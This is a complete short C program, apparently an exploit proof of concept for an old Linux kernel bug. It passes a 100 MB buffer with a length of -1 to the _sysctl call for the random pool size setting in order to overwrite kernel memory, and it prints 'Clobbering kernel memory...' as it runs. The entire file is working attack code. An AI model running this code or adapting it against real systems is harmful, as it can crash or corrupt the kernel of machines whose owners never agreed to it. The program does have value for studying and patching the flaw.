#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <linux/unistd.h>
#include <linux/sysctl.h>

#define CLOBBER_SIZE 100000000


_syscall1(int, _sysctl, struct __sysctl_args *, args)

int main(void)
{
	char *clobber;
	int name[] = { CTL_KERN, KERN_RANDOM, RANDOM_POOLSIZE };
	struct __sysctl_args args;

	if (getuid()) {
		printf("Only a user with uid 0 (no special capability "
			"required) can exploit this bug\n");
		return 1;
	}

	printf("Clobbering kernel memory...\n");
	clobber = (char *)calloc(1, CLOBBER_SIZE);
	if (clobber == NULL) {
		printf("Unable to allocate memory.\n");
		return 1;
	}
	args.name = name;
	args.nlen = 3;
	args.oldval = NULL;
	args.oldlenp = NULL;
	args.newval = clobber;
	args.newlen = -1;
	_sysctl(&args);

	printf("We're still here, exploit unsuccessful.\n");

	return 0;
}

